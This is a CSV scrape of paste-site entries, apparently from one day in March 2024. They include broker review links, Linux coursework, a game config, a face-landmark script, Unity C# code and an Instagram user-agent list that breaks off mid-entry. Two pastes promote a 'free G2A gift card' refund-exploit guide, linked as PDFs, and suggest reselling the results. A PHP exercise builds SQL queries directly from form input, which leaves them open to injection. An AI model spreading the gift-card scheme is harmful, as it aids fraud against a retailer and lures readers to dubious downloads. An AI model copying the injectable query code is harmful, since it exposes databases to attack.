id,title,username,language,date,content
FnnW0PAL,Review ACY Securities,reviewbrokers,PHP,Monday 25th of March 2024 07:04:35 AM CDT,https://www.reviewbrokers.net/review-acy-securities/
EbaikDXJ,data876,TestGuy1,JSON,Monday 25th of March 2024 07:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3e326e2f281b82cabdf2ee3928c78fdf0f10ac1bb703cb1677d38d79ce63d0497681b0fc3e57ac96e3d21f1104611bc452cbd508ce4dc55393f0f56b2b03bf1f912de5f1394076bd561a9ed4f2fb23c5adc3cc601f90bb5c84e1943aebf905ac00e1529099cc47519fe4bb8c16bbb18a6973e480214072685f226414f3c29e4b',
  otherdata: [
    'eca244029fda1d39c2399a118078dd9b',
    '7a580d1d9a8c472fdd2533e2eeb1e19c',
    'e6a79997444c7a41ca3549cf2d247bdd',
    'c107027c199fa33b2d0e222e9b0fa575',
    '2b438d7f247f9cfdc9c36ee563539e01',
    '8369c9f8e59afaa3982712aeda641306',
    '238fb32f19f85219b68cd8016cbae348',
    '45c2f57b311798fe562b680be03e998b'
  ]
}"
jNUAUfmH,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Monday 25th of March 2024 06:24:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_185482.pdf

Working as of:
25 March 2024


















"
H1a7g9s9,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Monday 25th of March 2024 06:24:00 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
25 March 2024















































"
5WL2BTpe,Review Soho Markets,fxvnpro,PHP,Monday 25th of March 2024 05:57:51 AM CDT,https://www.fxvnpro.com/review-soho-markets/
hpR2KEqC,Review Soho Markets,reviewbrokers,PHP,Monday 25th of March 2024 05:54:54 AM CDT,https://www.reviewbrokers.net/review-soho-markets/
BesGCjqi,sysop_2.1.5_Full,pan7nikt,Bash,Monday 25th of March 2024 05:31:12 AM CDT,"#2.1.5.1
#ZROB cd DO FOLDERU Z PROGRAMAMI
#uruchomic w oddzielnych oknach/sesjach ssh
./prog
./sprog
#podczas, gdy procesy sa uruchomione
echo -e '\033[0;32m2.1.5.1\033[0m'
echo -e '\033[0;32mCZTERY ROZNICE\033[0m'
echo -e '\033[0;32m1. Liczba nieanonimowych segmentow pameci w mapie pamieci (wicej dla skonsolidowanego dynamicznie)\033[0m'
pidof prog
pidof sprog
pmap -x PID_PROG
pmap -x PID_SPROG
echo -e 'r---- stale\nrw--- zmienne\nr-x-- text\nNieanonimowe bez [anon] i [stack]'

echo -e '\033[0;32m2. rozmiar pliku (statyczne wieksze)\033[0m'
stat -c %s prog
stat -c %s sprog
echo -e '\033[0;32m3. Biblioteki zainstalowane w systemie (dyn) a zewnetrzne (static)\033[0m'       
ldd prog
ldd sprog
echo -e '\033[0;32m4. Liczba wywolan systemowych (wiecej dla skonsolidowanej dynamicznie)\033[0m'
#NIE WYSWIETLA SIE PROMPT ALE NADAL TRZEBA WPISAC ZNAKI LUB KLIKNAC ENTER PO PROSTU
strace -c ./prog |& grep 'calls\|total'
strace -c ./sprog |& grep 'calls\|total'

echo -e '\033[0;32mOKRESLENIE RODZAJU ZASTOSOWANEJ KONSOLIDACJI\033[0m'
echo -e '\033[0;32mdla biblioteki\033[0m'
file /usr/lib64/libc.so.6
echo -e '\033[0;32mdla programu statycznie skonsolidowanego\033[0m'
file prog
echo -e '\033[0;32mdla programu dynamicznie skonsolidowanego\033[0m'
file sprog
 
#KOLEJNY PODPUNKT NAJLEPIEJ W NOWYM TERMINALU
#2.1.5.2
echo -e '\033[0;32m2.1.5.2\033[0m'
echo -e '\033[0;32mLista bibliotek wymaganych przez program\033[0m'
ldd prog
echo -e '\033[0;32mi biblioteke skonsolidowana dynamicznie\033[0m'
ldd /usr/lib64/libc.so.6
echo -e '\033[0;32mWszystkie biblioteki zarzadzane przez linker\033[0m'
ldconfig -p

#KOLEJNY PODPUNKT NAJLEPIEJ W NOWYM TERMINALU
#2.1.5.3
echo -e '\033[0;32m2.1.5.3\033[0m'
echo -e '\033[0;32mCzas przetwarzania w trybie nieuprzywilejowanym\033[0m'
time ls
echo -e '\033[0;32mCzas przetwarzania w trybie uprzywilejowanym\033[0m'
time sudo ls
echo -e 'Suma tych czasow nie musi byc zgodna, poniewaz proces w trakcie swojego zycia nie musi byc przetwarzany w zadnym trybie (moze np. oczekiwac na input)'
echo -e 'proces pochodzi\nw uprzywilejowanym: z jadra\nw nieuprzywilejowanym: z programu lub biblioteki.'
echo -e 'Zmiana nastepuje w momencie zgloszenia wywolania systemowego przez proces (rozkaz pulapki)'

#KOLEJNY PODPUNKT NAJLEPIEJ W NOWYM TERMINALU
#2.1.5.4
echo -e '\033[0;32m2.1.5.4\033[0m'
echo -e 'Wywolanie systemowe to rozwiazanie/funkcjonalnosc (procedura obslugi wywolania systemowego), ktore umozliwia procesowi skorzystanie z funkcjonalnosci oferowanych przez jadro\nTakie wywolania umozliwia biblioteka VDSO'
echo -e '\033[0;32mPorownanie ilosci zgloszen wywolan systemowych\033[0m'
strace -c ./prog |& grep 'calls\|total'
strace -c ./sprog |& grep 'calls\|total'"
a7MaVXwi,Untitled,Diaxon,PHP,Monday 25th of March 2024 05:13:00 AM CDT,"<?php


$conn = new mysqli(""localhost"", ""root"", """", ""contacts""); 
if ($conn){
    echo ""Connected to the database"";
} else {
    echo ""error"";
}



// Utwórz formularza (lista rozwijana) z nazwami kolumn w tabeli. Po przesłaniu danych z formularza
// wyświetla się tylko jedna kolumna z bazy. Na stronie nie mogą wyświetlać się błędy.

$sql = ""SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'contacts'"";
$result = $conn->query($sql);



?>

<p>Wybierz kolumnę</p>
<form action=""index4.php"" method=""POST"">
    <select name=""columns"">
        <?php
        for ($i = 0; $i < $result->num_rows; $i++){
            $row = $result->fetch_assoc();
            echo ""<option value='{$row['COLUMN_NAME']}'>{$row['COLUMN_NAME']}</option>"";
        }
        ?>
    </select>
    <p>Jak chcesz posortować?</p>
    <select name=""sort"">
        <option value=""ASC"">ASC</option>
        <option value=""DESC"">DESC</option>
    </select>
    <button type=""submit"">Submit</button>
<form>
<br>

<?php
if (isset($_POST['columns']) && isset($_POST['sort'])){
    $column_name = $_POST['columns'];
    $sort = $_POST['sort'];

    $sql = ""SELECT $column_name FROM contacts ORDER BY $column_name $sort"";
    $result = $conn->query($sql);
    if ($result->num_rows > 0){
        while ($row = $result->fetch_assoc()){
            echo $row[$column_name] . ""<br>"";
        }
    }
}
?>

<form action=""index4.php"" method=""POST"">
    <label>Wybierz kolumne</label>
    <select name=""columns"">
        <?php
        $sql = ""SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = N'contacts'"";
        $result = $conn->query($sql);
        
        for ($i = 0; $i < $result->num_rows; $i++){
            $row = $result->fetch_assoc();
            echo ""<option value='{$row['COLUMN_NAME']}'>{$row['COLUMN_NAME']}</option>"";
        }
        ?>
    </select>
    <label>Podaj ciąg znaków</label>
    <input name=""search"">
    <button type=""submit"">Submit</button>

    <?php
    if (isset($_POST['search'])){
        $search = $_POST['search'];
        $sql = ""SELECT * FROM contacts WHERE name LIKE "" . ""'%"" . ""$search"" . ""%'"";  
        $result = $conn->query($sql);
        for ($i = 0; $i < $result->num_rows; $i++){
            $row = $result->fetch_assoc();
            echo ""<p>{$row['name']}</p>"";
        }
    }


    ?>
<form>

<!-- Wyświetl dane z bazy w postaci tabeli HTML -->

<table>
    <tr>
        <th>Id</th>
        <th>Name</th>
        <th>Email</th>
        <th>Phone</th>
        <th>Created at</th>
    </tr>

    <?php
    $query = ""SELECT * FROM contacts"";
    $result = $conn->query($query);
    for ($i = 0; $i < $result->num_rows; $i++){
        $row = $result->fetch_assoc();
        echo ""<tr>"";
        echo ""<td>{$row['id']}</td>"";
        echo ""<td>{$row['name']}</td>"";
        echo ""<td>{$row['email']}</td>"";
        echo ""<td>{$row['phone']}</td>"";
        echo ""<td>{$row['created_at']}</td>"";
    }
    ?>

</table>

<!-- Napisz skrypt, który będzie wyświetlał z bazy dane wybranej osoby. -->

<form action=""index4.php"" method=""POST"">
    <label>Podaj id</label>
    <input name=""id"">
    <button type=""submit"">Submit</button>
    
    <?php

    if (isset($_POST['id'])){
        $query = ""SELECT * FROM contacts WHERE id = "" . $_POST['id'];
        $result = $conn->query($query);
        if ($result->num_rows > 0){
            $row = $result->fetch_assoc();
            echo ""<p>{$row['name']}</p>"";
            echo ""<p>{$row['email']}</p>"";
            echo ""<p>{$row['phone']}</p>"";
            echo ""<p>{$row['created_at']}</p>"";
        }
    }

    ?>
</form>



<br>
"
BFAzRNp3,cs 1.6 cfg,Nelien,SSH Config,Monday 25th of March 2024 05:11:19 AM CDT,"// Add custom configurations to the file ""userconfig.cfg"".

unbindall
bind ""TAB"" ""+showscores""
bind ""ENTER"" ""+attack""
bind ""ESCAPE"" ""cancelselect""
bind ""SPACE"" ""+jump""
bind ""'"" ""+moveup""
bind ""+"" ""sizeup""
bind "","" ""buyammo1""
bind ""-"" ""sizedown""
bind ""."" ""buyammo2""
bind ""/"" ""+movedown""
bind ""0"" ""slot10""
bind ""1"" ""slot1""
bind ""2"" ""slot2""
bind ""3"" ""slot3""
bind ""4"" ""slot4""
bind ""5"" ""slot5""
bind ""6"" ""slot6""
bind ""7"" ""slot7""
bind ""8"" ""slot8""
bind ""9"" ""slot9""
bind "";"" ""+mlook""
bind ""="" ""pb menu""
bind ""["" ""invprev""
bind ""]"" ""invnext""
bind ""`"" ""toggleconsole""
bind ""a"" ""+moveleft""
bind ""b"" ""buy;stopsound""
bind ""c"" ""radio3""
bind ""d"" ""+moveright""
bind ""e"" ""+use""
bind ""g"" ""drop""
bind ""h"" ""+commandmenu""
bind ""i"" ""showbriefing""
bind ""j"" ""cheer""
bind ""k"" ""+voicerecord""
bind ""l"" ""showbriefing""
bind ""m"" ""chooseteam""
bind ""n"" ""nightvision""
bind ""o"" ""buyequip""
bind ""q"" ""lastinv""
bind ""r"" ""+reload""
bind ""s"" ""+back""
bind ""t"" ""impulse 201""
bind ""u"" ""messagemode2""
bind ""v"" ""+attack2""
bind ""w"" ""+forward""
bind ""x"" ""radio2""
bind ""y"" ""messagemode""
bind ""z"" ""radio1""
bind ""~"" ""toggleconsole""
bind ""UPARROW"" ""+forward""
bind ""DOWNARROW"" ""+back""
bind ""LEFTARROW"" ""+moveleft""
bind ""RIGHTARROW"" ""+moveright""
bind ""ALT"" ""+strafe""
bind ""CTRL"" ""+duck""
bind ""SHIFT"" ""+speed""
bind ""F1"" ""autobuy""
bind ""F2"" ""rebuy""
bind ""F3"" ""cl_crosshair_size 1;cl_dynamiccrosshair 1""
bind ""F4"" ""cl_crosshair_size 2;cl_dynamiccrosshair 0""
bind ""F5"" ""snapshot""
bind ""F6"" ""save quick""
bind ""F7"" ""host_framerate 0""
bind ""F8"" ""host_framerate 0.1""
bind ""F10"" ""quit prompt""
bind ""DEL"" ""+reload""
bind ""HOME"" ""rhlgAZLH""
bind ""END"" ""slot3""
bind ""KP_HOME"" ""+showscores""
bind ""KP_LEFTARROW"" ""slot5""
bind ""KP_END"" ""drop""
bind ""KP_INS"" ""slot1""
bind ""MWHEELDOWN"" ""+jump""
bind ""MOUSE1"" ""+attack""
bind ""MOUSE3"" ""slot2""
bind ""PAUSE"" ""pause""
_cl_autowepswitch ""1""
_snd_mixahead ""0.1""
ati_npatch ""1.0""
ati_subdiv ""2.0""
bgmvolume ""1.000000""
bottomcolor ""6""
brightness ""5""
cl_allowdownload ""1""
cl_allowupload ""1""
cl_backspeed ""400""
cl_cmdbackup ""2""
cl_cmdrate ""101""
cl_corpsestay ""0.000000""
cl_crosshair_color ""50 250 50""
cl_crosshair_size ""medium""
cl_crosshair_translucent ""0""
cl_dlmax ""80""
cl_download_ingame ""1""
cl_dynamiccrosshair ""0""
cl_forwardspeed ""400""
cl_himodels ""0""
cl_idealpitchscale ""0.8""
cl_lc ""1""
cl_logocolor ""#Valve_Orange""
cl_logofile ""v_1""
cl_lw ""1""
cl_minmodels ""1""
cl_radartype ""0""
cl_righthand ""1""
cl_shadows ""0""
cl_timeout ""121221""
cl_updaterate ""101""
cl_vsmoothing ""0.05""
cl_weather ""0""
con_color ""0 500 0""
console ""1.000000""
crosshair ""1.000000""
fastsprites ""0""
fps_max ""100""
fps_modem ""0""
gamma ""3""
gl_dither ""1""
gl_flipmatrix ""0""
gl_fog ""1""
gl_monolights ""0""
gl_overbright ""0""
gl_polyoffset ""0.1""
hisound ""1""
hpk_maxsize ""4""
hud_capturemouse ""1""
hud_centerid ""1""
hud_draw ""1""
hud_fastswitch ""1""
hud_saytext_internal ""1""
hud_takesshots ""0""
joystick ""0""
lookspring ""0""
lookstrafe ""0.000000""
m_filter ""0""
m_forward ""1""
m_pitch ""0.022""
m_side ""0.8""
m_yaw ""0.022""
model ""gordon""
MP3FadeTime ""2.0""
MP3Volume ""0""
mp_decals ""0""
name ""AnGeL""
net_graph ""0""
net_graphpos ""1""
net_scale ""5""
r_bmodelhighfrac ""5.0""
r_detailtextures ""0""
s_a3d ""0.0""
s_automax_distance ""30""
s_automin_distance ""2""
s_bloat ""2.0""
s_distance ""60""
s_doppler ""0.0""
s_eax ""0.0""
s_leafnum ""0""
s_max_distance ""1000""
s_min_distance ""5""
s_numpolys ""200""
s_polykeep ""1000000000""
s_polysize ""10000000""
s_refdelay ""4""
s_refgain ""0.4""
s_rolloff ""1.0""
s_verbwet ""0.25""
sensitivity ""1.9""
skin """"
spec_autodirector_internal ""1""
spec_drawcone_internal ""1""
spec_drawnames_internal ""1""
spec_drawstatus_internal ""1""
spec_mode_internal ""2""
spec_pip ""0""
suitvolume ""0.250000""
sv_aim ""0""
sv_voiceenable ""1""
team """"
topcolor ""30""
viewsize ""110""
voice_enable ""0""
voice_forcemicrecord ""1""
voice_modenable ""1""
voice_scale ""2""
volume ""0.015""
setinfo ""status_monitor"" ""1""
setinfo ""_vgui_menus"" ""0""
setinfo ""_ah"" ""0""
setinfo ""_pw"" ""3AA""
+mlook
+jlook
exec userconfig.cfg
"
seNHefED,Untitled,RushFuture,Python,Monday 25th of March 2024 04:57:25 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
Источник: https://developers.google.com/mediapipe/solutions/vision/face_landmarker/python

Установка пререквизитов:
wget -O face_landmarker_v2_with_blendshapes.task -q https://storage.googleapis.com/mediapipe-models/face_landmarker/face_landmarker/float16/1/face_landmarker.task
pip install mediapipe
'''

from mediapipe import solutions
from mediapipe.framework.formats import landmark_pb2
import numpy as np
import matplotlib.pyplot as plt
import mediapipe as mp
from mediapipe.tasks import python
from mediapipe.tasks.python import vision
import cv2

def draw_landmarks_on_image(rgb_image, detection_result):
  face_landmarks_list = detection_result.face_landmarks
  annotated_image = np.copy(rgb_image)

  # Loop through the detected faces to visualize.
  for idx in range(len(face_landmarks_list)):
    face_landmarks = face_landmarks_list[idx]

    # Draw the face landmarks.
    face_landmarks_proto = landmark_pb2.NormalizedLandmarkList()
    face_landmarks_proto.landmark.extend([
      landmark_pb2.NormalizedLandmark(x=landmark.x, y=landmark.y, z=landmark.z) for landmark in face_landmarks
    ])

    solutions.drawing_utils.draw_landmarks(
        image=annotated_image,
        landmark_list=face_landmarks_proto,
        connections=mp.solutions.face_mesh.FACEMESH_TESSELATION,
        landmark_drawing_spec=None,
        connection_drawing_spec=mp.solutions.drawing_styles
        .get_default_face_mesh_tesselation_style())
    solutions.drawing_utils.draw_landmarks(
        image=annotated_image,
        landmark_list=face_landmarks_proto,
        connections=mp.solutions.face_mesh.FACEMESH_CONTOURS,
        landmark_drawing_spec=None,
        connection_drawing_spec=mp.solutions.drawing_styles
        .get_default_face_mesh_contours_style())
    solutions.drawing_utils.draw_landmarks(
        image=annotated_image,
        landmark_list=face_landmarks_proto,
        connections=mp.solutions.face_mesh.FACEMESH_IRISES,
          landmark_drawing_spec=None,
          connection_drawing_spec=mp.solutions.drawing_styles
          .get_default_face_mesh_iris_connections_style())

  return annotated_image

def plot_face_blendshapes_bar_graph(face_blendshapes):
  # Extract the face blendshapes category names and scores.
  face_blendshapes_names = [face_blendshapes_category.category_name for face_blendshapes_category in face_blendshapes]
  face_blendshapes_scores = [face_blendshapes_category.score for face_blendshapes_category in face_blendshapes]
  # The blendshapes are ordered in decreasing score value.
  face_blendshapes_ranks = range(len(face_blendshapes_names))

  fig, ax = plt.subplots(figsize=(12, 12))
  bar = ax.barh(face_blendshapes_ranks, face_blendshapes_scores, label=[str(x) for x in face_blendshapes_ranks])
  ax.set_yticks(face_blendshapes_ranks, face_blendshapes_names)
  ax.invert_yaxis()

  # Label each bar with values
  for score, patch in zip(face_blendshapes_scores, bar.patches):
    plt.text(patch.get_x() + patch.get_width(), patch.get_y(), f""{score:.4f}"", va=""top"")

  ax.set_xlabel('Score')
  ax.set_title(""Face Blendshapes"")
  plt.tight_layout()
  plt.show()

base_options = python.BaseOptions(model_asset_path='face_landmarker_v2_with_blendshapes.task')
options = vision.FaceLandmarkerOptions(base_options=base_options,
                                       output_face_blendshapes=True,
                                       output_facial_transformation_matrixes=True,
                                       num_faces=1)
detector = vision.FaceLandmarker.create_from_options(options)


cap = cv2.VideoCapture(0)
cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
cap.set(cv2.CAP_PROP_FPS, 30)
cap.set(cv2.CAP_PROP_FORMAT, -1)

while(cap.isOpened()):
    ret, frame = cap.read()
    if ret!=True: continue

    image = mp.Image(image_format=mp.ImageFormat.SRGB, data=frame)
    detection_result = detector.detect(image)
    annotated_image = draw_landmarks_on_image(image.numpy_view(), detection_result)
    cv2.imshow('annotated', cv2.flip(annotated_image, 1))
    if cv2.waitKey(1) & 0xFF == ord('q'): break

cap.release()
cv2.destroyAllWindows()"
fgVkyRPE,PlayerController,Raketa420311,C#,Monday 25th of March 2024 04:54:51 AM CDT,"using System;
using UnityEngine;

public class PlayerController : MonoBehaviour, IPlayerController
{
    [SerializeField] private CharacterData _playerData;
    [SerializeField] private CharacterBehaviour _playerBehaviour;
    private IInputService _inputService;

    public event Action OnPlayerDead;
    
    public float PlayerPositionZ => _playerBehaviour.PositionZ;

    private void Update()
    {
        if (!_playerBehaviour.IsMoving)
            return;
        
        if (!_playerBehaviour.IsAlive)
            return;

        Vector3 inputDirection = new Vector3(_inputService.MoveAxis.x, 0, 0);
        Vector3 moveDirection = (Vector3.forward + inputDirection).normalized;
        _playerBehaviour.Move(moveDirection);
        _playerBehaviour.RotateBody(_inputService.MoveAxis.x);
    }

    public void Initialize(IInputService inputService)
    {
        _inputService = inputService;
        
        _playerBehaviour.Initialize(_playerData);
        _playerBehaviour.OnCollideObstacle += HandlePlayerCollideObstacleEvent;
        _playerBehaviour.OnKill += HandlePlayerKillEvent;
        _inputService.OnJump += HandleJumpEvent;
        _inputService.OnDown += HandleDownEvent;
    }

    public void Dispose()
    {
        _playerBehaviour.OnCollideObstacle -= HandlePlayerCollideObstacleEvent;
        _playerBehaviour.OnKill -= HandlePlayerKillEvent;
        _inputService.OnJump -= HandleJumpEvent;
        _inputService.OnDown -= HandleDownEvent;
    }

    public void ResetPlayer(Vector3 position)
    {
        _playerBehaviour.transform.position = position;
        _playerBehaviour.Reset();
    }

    public void StartMove()
    {
        _playerBehaviour.StartMove();
    }

    public void StopMove()
    {
       _playerBehaviour.StopMove();
    }

    private void HandleJumpEvent()
    {
        _playerBehaviour.Jump();
    }

    private void HandleDownEvent()
    {
        _playerBehaviour.Down();
    }

    private void HandlePlayerCollideObstacleEvent()
    {
        _playerBehaviour.Kill();
    }

    private void HandlePlayerKillEvent()
    {
        OnPlayerDead?.Invoke();
    }
}"
FM5YVimH,CharacterBehaviour,Raketa420311,C#,Monday 25th of March 2024 04:54:34 AM CDT,"using System;
using System.Collections;
using UnityEngine;

public class CharacterBehaviour : MonoBehaviour
{
    [SerializeField] private CharacterController _characterController;
    [SerializeField] private CharacterAnimator _animator;
    [SerializeField] private RagdollController _ragdollController;
    [SerializeField] private Transform _body;
    [SerializeField] private Transform _groundCheckPoint;
    [SerializeField] private float _groundCheckDistance = 0.1f;
    private int _groundLayer;
    private bool _isGrounded;
    private Vector3 _moveDirection;
    private float _moveSpeed;
    private float _rotateAngle;
    private float _jumpHeight;
    private bool _isJumping;
    private AnimationCurve _jumpCurve;
    private bool _isAlive;
    private bool _isMoving;

    public event Action OnCollideObstacle;
    public event Action OnKill;

    public bool IsAlive => _isAlive;
    public bool IsMoving => _isMoving;
    public float PositionZ => transform.position.z;

    private void Update()
    {
        if (!_isAlive)
            return;
        
        CheckingGrounded();
        HandleGravity();
    }
    
    private void OnControllerColliderHit(ControllerColliderHit hit)
    {
        Obstacle obstacle = hit.gameObject.GetComponent<Obstacle>();
        
        if (obstacle != null)
        {
            Debug.Log($""Player collide obstacle = {hit.gameObject.name}"");
            OnCollideObstacle?.Invoke();
        }
    }

    public void Initialize(CharacterData characterData)
    {
        _animator.Initialize();
        
        _moveSpeed = characterData.BaseMoveSpeed;
        _rotateAngle = characterData.BaseRotateAngle;
        _jumpHeight = characterData.BaseJumpHeight;
        _jumpCurve = characterData.JumpCurve;
        _groundLayer = 1 << LayerMask.NameToLayer(""Ground"");
        
        _ragdollController.DeactivateRagdoll();
        _isAlive = true;
    }

    public void Move(Vector3 direction)
    {
        _moveDirection = direction * _moveSpeed;
        
        _characterController.Move(_moveDirection);
    }

    public void Jump()
    {
        if (!_isGrounded || _isJumping) 
            return;
        
        _animator.PlayJumpAnimation();
        _isJumping = true;
        StartCoroutine(JumpRoutine());
            
        Debug.Log(""Jump"");
    }

    public void Down()
    {
        _animator.PlayDownAnimation();
        Debug.Log(""Down"");
    }

    public void RotateBody(float moveHorizontalAxis)
    {
        float targetRotation = Mathf.Lerp(-_rotateAngle, _rotateAngle, (moveHorizontalAxis + 1f) / 2f);
        _body.transform.localRotation = Quaternion.Euler(0f, targetRotation, 0f);
    }

    public void Kill()
    {
        if (!_isAlive)
            return;

        _isAlive = false;
        _ragdollController.ActivateRagdoll();
        
        OnKill?.Invoke();
    }

    public void Reset()
    {
        _ragdollController.DeactivateRagdoll();
        _isAlive = true;
    }
    
    public void StartMove()
    {
        _isMoving = true;
        _animator.SetRunAnimation();
    }

    public void StopMove()
    {
        _isMoving = false;
        _animator.SetIdleAnimation();
    }

    private void HandleGravity()
    {
        if (!_isGrounded)
            _characterController.Move(Physics.gravity);
    }

    private void CheckingGrounded()
    {
        Collider[] colliders = Physics.OverlapSphere(_groundCheckPoint.position, _groundCheckDistance, _groundLayer);

        _isGrounded = colliders.Length > 0;
    }

    private IEnumerator JumpRoutine()
    {
        float timer = 0f;

        while (timer <= _jumpCurve.keys[_jumpCurve.length - 1].time)
        {
            float jumpHeight = _jumpCurve.Evaluate(timer) *_jumpHeight;
            Vector3 currentTransformPosition = transform.position;
            Vector3 jumpPosition = currentTransformPosition + Vector3.up * jumpHeight;
            Vector3 jumpDirection = jumpPosition - currentTransformPosition;
            
            _characterController.Move(jumpDirection);
        
            timer += Time.deltaTime;
            
            yield return null;
        }

        _isJumping = false;
    }
}"
xnNK99VX,140.213.219.189-/sdcard/Premium/useragent_ig.py.py,OBF-XIn,Python,Monday 25th of March 2024 04:47:17 AM CDT,"# useragent
import random

class Useragent:
    def __init__(self) -> None:
        pass
        
    def useragent_api(self):
        self.nexus = ['Galaxy Nexus', 'Nexus 10', 'Nexus 2', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 4', 'Nexus 5', 'phone/Nexus 5', 'Nexus 5X', 'Nexus 6', 'Nexus 7', 'Nexus 9', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus One', 'Nexus Player', 'Nexus Player', 'Nexus S', 'Nexus S', 'Nexus S 4G', 'nexus S', 'Nexus S', 'Nexus s', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S', 'Nexus S']
        self.micromax = ['Micromax 10', 'Micromax 1J', 'Micromax 86519', 'Micromax A064', 'Micromax_A064', 'Micromax A065', 'Micromax_A065', 'Micromax A066', 'Micromax_A066', 'Micromax A067', 'Micromax_A067', 'MICROMAX_A068', 'MICROMAX A068', 'Micromax A068', 'Micromax A069', 'Micromax_A069', 'Micromax A075', 'Micromax A082', 'Micromax_A082', 'Micromax A089', 'Micromax_A089', 'Micromax A091', 'Micromax A092', 'Micromax_A092', 'Micromax A093', 'Micromax_A093', 'Micromax A095', 'Micromax A096', 'Micromax_A101', 'Micromax A102', 'Micromax_A102', 'Micromax A104', 'Micromax a104', 'Micromax A105', 'Micromax_A105', 'Micromax A106', 'Micromax-A106', 'Micromax A108', 'Micromax_A109', 'Micromax A109', 'Micromax A110', 'Micromax_A110', 'Micromax A110Q', 'Micromax_A110Q', 'Micromax A111', 'Micromax A114', 'Micromax A114R', 'Micromax_A114R', 'Micromax A115', 'Micromax_A115', 'Micromax A116', 'Micromax_A116', 'Micromax A116i', 'Micromax_A116i', 'Micromax A117', 'Micromax_A117', 'Micromax A118R', 'Micromax A119', 'Micromax A120', 'Micromax A121', 'Micromax_A121', 'Micromax A15', 'Micromax A177', 'Micromax A190', 'Micromax_A190', 'Micromax A200', 'Micromax_A200', 'Micromax A21', 'Micromax A210', 'Micromax A24', 'Micromax_A24', 'Micromax A25 Smarty', 'Micromax A250', 'Micromax A255', 'Micromax_A255', 'Micromax A26', 'Micromax_A26', 'Micromax_A27', 'Micromax A27', 'Micromax_A28', 'Micromax A28/GRI40', 'Micromax A28', 'Micromax A290', 'Micromax A30', 'Micromax A300', 'Micromax A310', 'Micromax A311', 'Micromax A315', 'Micromax_A315', 'Micromax_A316', 'Micromax A316', 'Micromax_A34', 'Micromax A34', 'Micromax_A35', 'Micromax A35', 'Micromax A350', 'Micromax_A36', 'Micromax A36', 'Micromax_A37', 'Micromax A37', 'Micromax A37B', 'Micromax_A37B', 'Micromax A40', 'Micromax_A40', 'Micromax A46', 'Micromax_A46', 'Micromax A47', 'MicromaxA47', 'Micromax_A50', 'Micromax A50', 'Micromax A51', 'Micromax A52', 'Micromax A54', 'Micromax A56', 'Micromax_A57', 'Micromax A57', 'Micromax A58', 'Micromax_A58', 'Micromax A59', 'Micromax A60', 'Micromax A61', 'Micromax A62', 'Micromax_A62', 'Micromax A63', 'Micromax_A63', 'Micromax_A65', 'Micromax A65', 'Micromax_A66', 'Micromax A66', 'Micromax A67', 'Micromax A68', 'Micromax A69', 'Micromax_A69', 'Micromax_A70', 'Micromax A700', 'Micromax A71', 'Micromax_A71', 'Micromax A72', 'Micromax_A72', 'Micromax A73', 'Micromax_A74', 'Micromax A74', 'Micromax A75', 'Micromax_A76', 'Micromax A76', 'Micromax A77', 'Micromax A78', 'Micromax A79', 'en_us Micromax A80', 'Micromax A80', 'Micromax A82', 'Micromax_A82', 'Micromax A84', 'Micromax A85', 'Micromax A86', 'Micromax_A86', 'Micromax_A87', 'Micromax A87', 'Micromax A87 . Ninja 4.0', 'Micromax A88', 'Micromax_A88', 'Micromax A89', 'Micromax A90', 'Micromax A90s', 'MIcromax_A90s', 'Micromax A90S', 'Micromax A91', 'Micromax_A91', 'Micromax_A92', 'Micromax A92', 'MicromaxA93', 'Micromax A93', 'Micromax A94', 'Micromax_A94', 'Micromax A96', 'Micromax_A96', 'Micromax A97', 'Micromax_A99', 'Micromax A99', 'Micromax_AD3520', 'Micromax AD3520', 'Micromax AD3550', 'Micromax AD4500', 'Micromax_AD4500', 'Micromax AE90', 'Micromax AO5510', 'Micromax AQ5000', 'Micromax B4A', 'Micromax B5 Pro', 'B5Pro', 'Micromax_Bharat_5_Plus', 'Micromax Q402Plus', 'Micromax Q440', 'Micromax Bharat 5', 'Micromax Q4204', 'Micromax Bharat 5 Plus', 'Micromax Bharat 5 Pro', 'Micromax Bolt 3425', 'Micromax Bolt 2', 'Micromax Q402+', 'Micromax Q306', 'Micromax Q3001', 'Micromax Q301', 'Micromax Q303', 'Micromax Q324', 'Micromax Q326', 'Q327', 'Micromax Q327', 'Micromax Q3301', 'Micromax Q333', 'Micromax_Q333', 'Micromax Q338', 'Micromax Q346', 'Micromax Q354', 'Micromax Q357', 'Micromax Q383', 'Micromax_S302', 'Micromax S302', 'Micromax Q424', 'Micromax Q352', 'Micromax Q4101', 'Micromax C2A', 'Micromax C9', 'Micromax C1', 'Micromax C1A', 'Micromax C2APLS', 'Micromax Q4310', 'Micromax E4815', 'arm_64 Micromax E481', 'Micromax E481', 'Micromax E4816', 'Micromax Q462', 'Micromax Q463', 'Micromax E485', 'Micromax E484', 'Micromax AQ4501', 'Micromax AQ4502', 'A240', 'Micromax A240', 'Micromax Q391', 'Micromax E453', 'Micromax A107', 'Micromax HS2', 'Micromax HS1', 'Micromax_HS3', 'en Micromax_HS3', 'AQ5001', 'Micromax AQ5001', 'AQ5001 Canvas Power', 'Micromax Q392', 'Micromax Q465', 'Micromax Q461', 'Micromax Q350R', 'Micromax 